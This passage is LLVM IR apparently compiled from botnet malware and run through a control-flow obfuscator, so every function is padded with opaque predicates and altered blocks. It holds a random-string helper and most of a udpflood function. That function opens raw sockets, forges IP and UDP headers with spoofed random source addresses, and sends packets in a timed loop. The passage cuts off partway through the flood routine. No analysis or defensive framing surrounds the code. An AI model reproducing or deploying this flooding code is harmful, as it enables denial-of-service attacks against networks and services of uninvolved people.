originalBB:                                       ; preds = %originalBBalteredBB, %12
  %21 = load i8*, i8** %2, align 8
  %22 = load i8*, i8** %2, align 8
  %23 = call i64 @strlen(i8* %22) #10
  %24 = sub i64 %23, 1
  %25 = getelementptr inbounds i8, i8* %21, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = icmp eq i32 %27, 10
  %29 = load i32, i32* @x.17
  %30 = load i32, i32* @y.18
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %37

; <label>:37:                                     ; preds = %originalBBpart2, %3
  %38 = phi i1 [ true, %3 ], [ %28, %originalBBpart2 ]
  br i1 %38, label %39, label %45

; <label>:39:                                     ; preds = %37
  %40 = load i8*, i8** %2, align 8
  %41 = load i8*, i8** %2, align 8
  %42 = call i64 @strlen(i8* %41) #10
  %43 = sub i64 %42, 1
  %44 = getelementptr inbounds i8, i8* %40, i64 %43
  store i8 0, i8* %44, align 1
  br label %3

; <label>:45:                                     ; preds = %37
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %12
  %46 = load i8*, i8** %2, align 8
  %47 = load i8*, i8** %2, align 8
  %48 = call i64 @strlen(i8* %47) #10
  %_ = sub i64 0, %48
  %gen = add i64 %_, 1
  %49 = sub i64 %48, 1
  %50 = getelementptr inbounds i8, i8* %46, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = sext i8 %51 to i32
  %53 = icmp eq i32 %52, 10
  br label %originalBB
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i8* @makestring() #0 {
  %1 = alloca i8*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [1024 x i8], align 16
  %8 = call i32 @rand() #6
  %9 = srem i32 %8, 5
  %10 = add nsw i32 %9, 4
  store i32 %10, i32* %2, align 4
  %11 = load i32, i32* %2, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = call noalias i8* @malloc(i64 %13) #6
  store i8* %14, i8** %1, align 8
  %15 = load i8*, i8** %1, align 8
  %16 = load i32, i32* %2, align 4
  %17 = add nsw i32 %16, 1
  %18 = sext i32 %17 to i64
  call void @llvm.memset.p0i8.i64(i8* %15, i8 0, i64 %18, i32 1, i1 false)
  %19 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0))
  store %struct._IO_FILE* %19, %struct._IO_FILE** %4, align 8
  %20 = icmp eq %struct._IO_FILE* %19, null
  br i1 %20, label %21, label %55

; <label>:21:                                     ; preds = %0
  %22 = load i32, i32* @x.19
  %23 = load i32, i32* @y.20
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  store i32 0, i32* %3, align 4
  %30 = load i32, i32* @x.19
  %31 = load i32, i32* @y.20
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %38

; <label>:38:                                     ; preds = %51, %originalBBpart2
  %39 = load i32, i32* %3, align 4
  %40 = load i32, i32* %2, align 4
  %41 = icmp slt i32 %39, %40
  br i1 %41, label %42, label %54

; <label>:42:                                     ; preds = %38
  %43 = call i32 @rand() #6
  %44 = srem i32 %43, 26
  %45 = add nsw i32 %44, 65
  %46 = trunc i32 %45 to i8
  %47 = load i8*, i8** %1, align 8
  %48 = load i32, i32* %3, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  store i8 %46, i8* %50, align 1
  br label %51

; <label>:51:                                     ; preds = %42
  %52 = load i32, i32* %3, align 4
  %53 = add nsw i32 %52, 1
  store i32 %53, i32* %3, align 4
  br label %38

; <label>:54:                                     ; preds = %38
  br label %116

; <label>:55:                                     ; preds = %0
  %56 = call i32 @rand() #6
  %57 = call i32 @rand() #6
  %58 = mul nsw i32 %56, %57
  %59 = srem i32 %58, 45402
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %6, align 4
  store i32 0, i32* %3, align 4
  br label %61

; <label>:61:                                     ; preds = %85, %55
  %62 = load i32, i32* @x.19
  %63 = load i32, i32* @y.20
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %61
  %70 = load i32, i32* %3, align 4
  %71 = load i32, i32* %6, align 4
  %72 = icmp slt i32 %70, %71
  %73 = load i32, i32* @x.19
  %74 = load i32, i32* @y.20
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %72, label %81, label %88

; <label>:81:                                     ; preds = %originalBBpart24
  %82 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  %83 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %84 = call i8* @fgets(i8* %82, i32 1024, %struct._IO_FILE* %83)
  br label %85

; <label>:85:                                     ; preds = %81
  %86 = load i32, i32* %3, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %3, align 4
  br label %61

; <label>:88:                                     ; preds = %originalBBpart24
  %89 = load i32, i32* @x.19
  %90 = load i32, i32* @y.20
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %88
  %97 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %97, i8 0, i64 1024, i32 16, i1 false)
  %98 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  %99 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %100 = call i8* @fgets(i8* %98, i32 1024, %struct._IO_FILE* %99)
  %101 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  call void @filter(i8* %101)
  %102 = load i8*, i8** %1, align 8
  %103 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  %104 = load i32, i32* %2, align 4
  %105 = sext i32 %104 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %102, i8* %103, i64 %105, i32 1, i1 false)
  %106 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %107 = call i32 @fclose(%struct._IO_FILE* %106)
  %108 = load i32, i32* @x.19
  %109 = load i32, i32* @y.20
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %116

; <label>:116:                                    ; preds = %originalBBpart28, %54
  %117 = load i8*, i8** %1, align 8
  ret i8* %117

originalBBalteredBB:                              ; preds = %originalBB, %21
  store i32 0, i32* %3, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %61
  %118 = load i32, i32* %3, align 4
  %119 = load i32, i32* %6, align 4
  %120 = icmp slt i32 %118, %119
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %88
  %121 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %121, i8 0, i64 1024, i32 16, i1 false)
  %122 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  %123 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %124 = call i8* @fgets(i8* %122, i32 1024, %struct._IO_FILE* %123)
  %125 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  call void @filter(i8* %125)
  %126 = load i8*, i8** %1, align 8
  %127 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  %128 = load i32, i32* %2, align 4
  %129 = sext i32 %128 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %126, i8* %127, i64 %129, i32 1, i1 false)
  %130 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %131 = call i32 @fclose(%struct._IO_FILE* %130)
  br label %originalBB6
}

; Function Attrs: nounwind
declare i32 @rand() #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #3

declare %struct._IO_FILE* @fopen(i8*, i8*) #5

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #5

declare i32 @fclose(%struct._IO_FILE*) #5

; Function Attrs: noinline nounwind uwtable
define void @udpflood(i8*, i32, i32, i32) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.udphdr*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 10, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 2, i16* %26, align 4
  %27 = load i32, i32* %6, align 4
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %33

; <label>:29:                                     ; preds = %4
  %30 = call i32 @rand_cmwc()
  %31 = trunc i32 %30 to i16
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %31, i16* %32, align 2
  br label %38

; <label>:33:                                     ; preds = %4
  %34 = load i32, i32* %6, align 4
  %35 = trunc i32 %34 to i16
  %36 = call zeroext i16 @htons(i16 zeroext %35) #9
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  br label %38

; <label>:38:                                     ; preds = %33, %29
  %39 = load i8*, i8** %5, align 8
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %41 = call i32 @getHost(i8* %39, %struct.in_addr* %40)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %38
  br label %449

; <label>:44:                                     ; preds = %38
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 3
  %46 = getelementptr inbounds [8 x i8], [8 x i8]* %45, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 8, i32 4, i1 false)
  %47 = load i32, i32* %9, align 4
  store i32 %47, i32* %12, align 4
  %48 = load i32, i32* %10, align 4
  %49 = icmp eq i32 %48, 32
  br i1 %49, label %50, label %167

; <label>:50:                                     ; preds = %44
  %51 = load i32, i32* @x.21
  %52 = load i32, i32* @y.22
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %50
  %59 = call i32 @socket(i32 2, i32 2, i32 17) #6
  store i32 %59, i32* %13, align 4
  %60 = load i32, i32* %13, align 4
  %61 = icmp ne i32 %60, 0
  %62 = load i32, i32* @x.21
  %63 = load i32, i32* @y.22
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %61, label %87, label %70

; <label>:70:                                     ; preds = %originalBBpart2
  %71 = load i32, i32* @x.21
  %72 = load i32, i32* @y.22
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %70
  %79 = load i32, i32* @x.21
  %80 = load i32, i32* @y.22
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %449

; <label>:87:                                     ; preds = %originalBBpart2
  %88 = load i32, i32* @x.21
  %89 = load i32, i32* @y.22
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %87
  %96 = load i32, i32* %8, align 4
  %97 = add nsw i32 %96, 1
  %98 = sext i32 %97 to i64
  %99 = call noalias i8* @malloc(i64 %98) #6
  store i8* %99, i8** %14, align 8
  %100 = load i8*, i8** %14, align 8
  %101 = icmp eq i8* %100, null
  %102 = load i32, i32* @x.21
  %103 = load i32, i32* @y.22
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %101, label %110, label %111

; <label>:110:                                    ; preds = %originalBBpart28
  br label %449

; <label>:111:                                    ; preds = %originalBBpart28
  %112 = load i8*, i8** %14, align 8
  %113 = load i32, i32* %8, align 4
  %114 = add nsw i32 %113, 1
  %115 = sext i32 %114 to i64
  call void @llvm.memset.p0i8.i64(i8* %112, i8 0, i64 %115, i32 1, i1 false)
  %116 = load i8*, i8** %14, align 8
  %117 = load i32, i32* %8, align 4
  call void @makeRandomStr(i8* %116, i32 %117)
  %118 = call i64 @time(i64* null) #6
  %119 = load i32, i32* %7, align 4
  %120 = sext i32 %119 to i64
  %121 = add nsw i64 %118, %120
  %122 = trunc i64 %121 to i32
  store i32 %122, i32* %15, align 4
  store i32 0, i32* %16, align 4
  br label %123

; <label>:123:                                    ; preds = %163, %162, %111
  %124 = load i32, i32* %13, align 4
  %125 = load i8*, i8** %14, align 8
  %126 = load i32, i32* %8, align 4
  %127 = sext i32 %126 to i64
  %128 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %129 = call i64 @sendto(i32 %124, i8* %125, i64 %127, i32 0, %struct.sockaddr* %128, i32 16)
  %130 = load i32, i32* %16, align 4
  %131 = load i32, i32* %12, align 4
  %132 = icmp eq i32 %130, %131
  br i1 %132, label %133, label %163

; <label>:133:                                    ; preds = %123
  %134 = load i32, i32* %6, align 4
  %135 = icmp eq i32 %134, 0
  br i1 %135, label %136, label %140

; <label>:136:                                    ; preds = %133
  %137 = call i32 @rand_cmwc()
  %138 = trunc i32 %137 to i16
  %139 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %138, i16* %139, align 2
  br label %140

; <label>:140:                                    ; preds = %136, %133
  %141 = call i64 @time(i64* null) #6
  %142 = load i32, i32* %15, align 4
  %143 = sext i32 %142 to i64
  %144 = icmp sgt i64 %141, %143
  br i1 %144, label %145, label %162

; <label>:145:                                    ; preds = %140
  %146 = load i32, i32* @x.21
  %147 = load i32, i32* @y.22
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %145
  %154 = load i32, i32* @x.21
  %155 = load i32, i32* @y.22
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %166

; <label>:162:                                    ; preds = %140
  store i32 0, i32* %16, align 4
  br label %123

; <label>:163:                                    ; preds = %123
  %164 = load i32, i32* %16, align 4
  %165 = add i32 %164, 1
  store i32 %165, i32* %16, align 4
  br label %123

; <label>:166:                                    ; preds = %originalBBpart212
  br label %449

; <label>:167:                                    ; preds = %44
  %168 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %168, i32* %17, align 4
  %169 = load i32, i32* %17, align 4
  %170 = icmp ne i32 %169, 0
  br i1 %170, label %172, label %171

; <label>:171:                                    ; preds = %167
  br label %449

; <label>:172:                                    ; preds = %167
  store i32 1, i32* %18, align 4
  %173 = load i32, i32* %17, align 4
  %174 = bitcast i32* %18 to i8*
  %175 = call i32 @setsockopt(i32 %173, i32 0, i32 3, i8* %174, i32 4) #6
  %176 = icmp slt i32 %175, 0
  br i1 %176, label %177, label %178

; <label>:177:                                    ; preds = %172
  br label %449

; <label>:178:                                    ; preds = %172
  store i32 50, i32* %19, align 4
  br label %179

; <label>:179:                                    ; preds = %originalBBpart234, %178
  %180 = load i32, i32* @x.21
  %181 = load i32, i32* @y.22
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %179
  %188 = load i32, i32* %19, align 4
  %189 = add nsw i32 %188, -1
  store i32 %189, i32* %19, align 4
  %190 = icmp ne i32 %188, 0
  %191 = load i32, i32* @x.21
  %192 = load i32, i32* @y.22
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBBpart228, label %originalBB14alteredBB

originalBBpart228:                                ; preds = %originalBB14
  br i1 %190, label %199, label %222

; <label>:199:                                    ; preds = %originalBBpart228
  %200 = load i32, i32* @x.21
  %201 = load i32, i32* @y.22
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %199
  %208 = call i64 @time(i64* null) #6
  %209 = call i32 @rand_cmwc()
  %210 = zext i32 %209 to i64
  %211 = xor i64 %208, %210
  %212 = trunc i64 %211 to i32
  call void @srand(i32 %212) #6
  %213 = call i32 @rand() #6
  call void @init_rand(i32 %213)
  %214 = load i32, i32* @x.21
  %215 = load i32, i32* @y.22
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBBpart234, label %originalBB30alteredBB

originalBBpart234:                                ; preds = %originalBB30
  br label %179

; <label>:222:                                    ; preds = %originalBBpart228
  %223 = load i32, i32* %10, align 4
  %224 = icmp eq i32 %223, 0
  br i1 %224, label %225, label %226

; <label>:225:                                    ; preds = %222
  store i32 0, i32* %20, align 4
  br label %232

; <label>:226:                                    ; preds = %222
  %227 = load i32, i32* %10, align 4
  %228 = sub nsw i32 32, %227
  %229 = shl i32 1, %228
  %230 = sub nsw i32 %229, 1
  %231 = xor i32 %230, -1
  store i32 %231, i32* %20, align 4
  br label %232

; <label>:232:                                    ; preds = %226, %225
  %233 = load i32, i32* %8, align 4
  %234 = sext i32 %233 to i64
  %235 = add i64 28, %234
  %236 = call i8* @llvm.stacksave()
  store i8* %236, i8** %21, align 8
  %237 = alloca i8, i64 %235, align 16
  %238 = bitcast i8* %237 to %struct.iphdr*
  store %struct.iphdr* %238, %struct.iphdr** %22, align 8
  %239 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %240 = bitcast %struct.iphdr* %239 to i8*
  %241 = getelementptr i8, i8* %240, i64 20
  %242 = bitcast i8* %241 to %struct.udphdr*
  store %struct.udphdr* %242, %struct.udphdr** %23, align 8
  %243 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %244 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %245 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %244, i32 0, i32 0
  %246 = load i32, i32* %245, align 4
  %247 = load i32, i32* %20, align 4
  %248 = call i32 @getRandomIP(i32 %247)
  %249 = call i32 @htonl(i32 %248) #9
  %250 = load i32, i32* %8, align 4
  %251 = sext i32 %250 to i64
  %252 = add i64 8, %251
  %253 = trunc i64 %252 to i32
  call void @makeIPPacket(%struct.iphdr* %243, i32 %246, i32 %249, i8 zeroext 17, i32 %253)
  %254 = load i32, i32* %8, align 4
  %255 = sext i32 %254 to i64
  %256 = add i64 8, %255
  %257 = trunc i64 %256 to i16
  %258 = call zeroext i16 @htons(i16 zeroext %257) #9
  %259 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %260 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %259, i32 0, i32 2
  store i16 %258, i16* %260, align 2
  %261 = call i32 @rand_cmwc()
  %262 = trunc i32 %261 to i16
  %263 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %264 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %263, i32 0, i32 0
  store i16 %262, i16* %264, align 2
  %265 = load i32, i32* %6, align 4
  %266 = icmp eq i32 %265, 0
  br i1 %266, label %267, label %285

; <label>:267:                                    ; preds = %232
  %268 = load i32, i32* @x.21
  %269 = load i32, i32* @y.22
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %267
  %276 = call i32 @rand_cmwc()
  %277 = load i32, i32* @x.21
  %278 = load i32, i32* @y.22
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br label %290

; <label>:285:                                    ; preds = %232
  %286 = load i32, i32* %6, align 4
  %287 = trunc i32 %286 to i16
  %288 = call zeroext i16 @htons(i16 zeroext %287) #9
  %289 = zext i16 %288 to i32
  br label %290

; <label>:290:                                    ; preds = %285, %originalBBpart238
  %291 = phi i32 [ %276, %originalBBpart238 ], [ %289, %285 ]
  %292 = load i32, i32* @x.21
  %293 = load i32, i32* @y.22
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %290
  %300 = trunc i32 %291 to i16
  %301 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %302 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %301, i32 0, i32 1
  store i16 %300, i16* %302, align 2
  %303 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %304 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %303, i32 0, i32 3
  store i16 0, i16* %304, align 2
  %305 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %306 = bitcast %struct.udphdr* %305 to i8*
  %307 = getelementptr inbounds i8, i8* %306, i64 8
  %308 = load i32, i32* %8, align 4
  call void @makeRandomStr(i8* %307, i32 %308)
  %309 = bitcast i8* %237 to i16*
  %310 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %311 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %310, i32 0, i32 2
  %312 = load i16, i16* %311, align 2
  %313 = zext i16 %312 to i32
  %314 = call zeroext i16 @csum(i16* %309, i32 %313)
  %315 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %316 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %315, i32 0, i32 7
  store i16 %314, i16* %316, align 2
  %317 = call i64 @time(i64* null) #6
  %318 = load i32, i32* %7, align 4
  %319 = sext i32 %318 to i64
  %320 = add nsw i64 %317, %319
  %321 = trunc i64 %320 to i32
  store i32 %321, i32* %24, align 4
  store i32 0, i32* %25, align 4
  %322 = load i32, i32* @x.21
  %323 = load i32, i32* @y.22
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBBpart250, label %originalBB40alteredBB

originalBBpart250:                                ; preds = %originalBB40
  br label %330

; <label>:330:                                    ; preds = %444, %originalBBpart266, %originalBBpart250
  br label %331

; <label>:331:                                    ; preds = %330
  %332 = load i32, i32* %17, align 4
  %333 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %334 = call i64 @sendto(i32 %332, i8* %237, i64 %235, i32 0, %struct.sockaddr* %333, i32 16)
  %335 = call i32 @rand_cmwc()
  %336 = trunc i32 %335 to i16
  %337 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %338 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %337, i32 0, i32 0
  store i16 %336, i16* %338, align 2
  %339 = load i32, i32* %6, align 4
  %340 = icmp eq i32 %339, 0
  br i1 %340, label %341, label %359

; <label>:341:                                    ; preds = %331
  %342 = load i32, i32* @x.21
  %343 = load i32, i32* @y.22
  %344 = sub i32 %342, 1
  %345 = mul i32 %342, %344
  %346 = urem i32 %345, 2
  %347 = icmp eq i32 %346, 0
  %348 = icmp slt i32 %343, 10
  %349 = or i1 %347, %348
  br i1 %349, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %341
  %350 = call i32 @rand_cmwc()
  %351 = load i32, i32* @x.21
  %352 = load i32, i32* @y.22
  %353 = sub i32 %351, 1
  %354 = mul i32 %351, %353
  %355 = urem i32 %354, 2
  %356 = icmp eq i32 %355, 0
  %357 = icmp slt i32 %352, 10
  %358 = or i1 %356, %357
  br i1 %358, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br label %380

; <label>:359:                                    ; preds = %331
  %360 = load i32, i32* @x.21
  %361 = load i32, i32* @y.22
  %362 = sub i32 %360, 1
  %363 = mul i32 %360, %362
  %364 = urem i32 %363, 2
  %365 = icmp eq i32 %364, 0
  %366 = icmp slt i32 %361, 10
  %367 = or i1 %365, %366
  br i1 %367, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %359
  %368 = load i32, i32* %6, align 4
  %369 = trunc i32 %368 to i16
  %370 = call zeroext i16 @htons(i16 zeroext %369) #9
  %371 = zext i16 %370 to i32
  %372 = load i32, i32* @x.21
  %373 = load i32, i32* @y.22
  %374 = sub i32 %372, 1
  %375 = mul i32 %372, %374
  %376 = urem i32 %375, 2
  %377 = icmp eq i32 %376, 0
  %378 = icmp slt i32 %373, 10
  %379 = or i1 %377, %378
  br i1 %379, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br label %380

